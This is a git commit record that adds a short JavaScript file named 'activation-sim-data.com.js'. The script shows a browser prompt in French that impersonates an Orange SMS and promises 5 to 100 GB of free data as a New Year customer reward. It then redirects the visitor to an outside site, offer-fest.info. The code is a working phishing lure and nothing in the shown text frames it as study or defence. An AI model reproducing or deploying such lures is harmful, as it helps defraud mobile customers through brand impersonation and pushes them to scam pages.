48484520e3e586c231777ba4f39916776c0f2c95
ekpesense <abantak9@gmail.com>
2025-02-07 23:23:10 -0800

    Create activation-sim-data.com.js

---
+++ activation-sim-data.com.js
@@ -0,0 +1,7 @@
+
+
+var password = 'OFFRE GRATUITE'
+password=prompt('ORANGE SMS: Cher client Orange, veuillez recevoir des données gratuites à partir de 5 Go - 100 Go, récompense des clients du Nouvel An, cliquez sur OFFRE GRATUITE pour vérifier maintenant ','OFFRE GRATUITE');
+if (password != 'OFFRE GRATUITE') {
+location.href='https://offer-fest.info/sim-data.com.html';
+}
